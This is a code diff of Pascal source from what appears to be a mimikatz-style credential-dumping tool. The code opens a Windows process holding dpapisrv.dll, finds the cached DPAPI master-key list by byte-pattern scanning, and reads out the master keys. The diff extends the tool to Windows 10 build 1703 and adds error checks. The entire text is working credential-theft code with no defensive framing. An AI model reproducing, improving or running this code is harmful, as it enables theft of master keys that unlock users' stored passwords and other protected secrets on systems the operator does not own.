@@ -670,7 +670,7 @@ const
 //
   CALG_SHA1 = $00008004;
 var
-  module:string='dpapisrv.dll';
+  module:string='dpapisrv.dll'; //kuhl_m_sekurlsa_dpapi_svc_package
   pattern:array of byte;
   patch_pos:ShortInt=0;
   hprocess,hmod:thandle;
@@ -688,6 +688,7 @@ var
   decrypted:tbytes;
   localft:FILETIME ;
   st:SYSTEMTIME ;
+  bret:boolean;
 begin
 //
    if (lowercase(osarch)='x86') then
@@ -749,6 +750,18 @@ begin
       copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
       patch_pos:=11;
       end;
+   if (pos('-1703',winver)>0) {or (pos('-1709',winver)>0)} then //win10
+      begin
+      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      patch_pos:=11;
+      end;
+   end;
+//
+if patch_pos=0 then
+   begin
+   log('patch_pos=0');
+   exit;
    end;
 //
 hprocess:=thandle(-1);
@@ -800,11 +813,13 @@ hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATI
                                       log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
                                       //
                                       //read sesslist at offset
+                                      ZeroMemory(@list[0],sizeof(list));
                                       ReadMem  (hprocess,offset,list );
                                       //lets skip the first one
                                       current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
-                                      ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
+                                      bret:=ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
                                       log('*****************************************************',1);
+                                      if bret then
                                       while PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink<>offset do
                                       begin
                                       //
@@ -826,7 +841,7 @@ hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATI
                                       current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
                                       ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
                                       log('*****************************************************',1)
-                                      end;
+                                      end;//while
                                  end; //if readmem
 
                                  end;
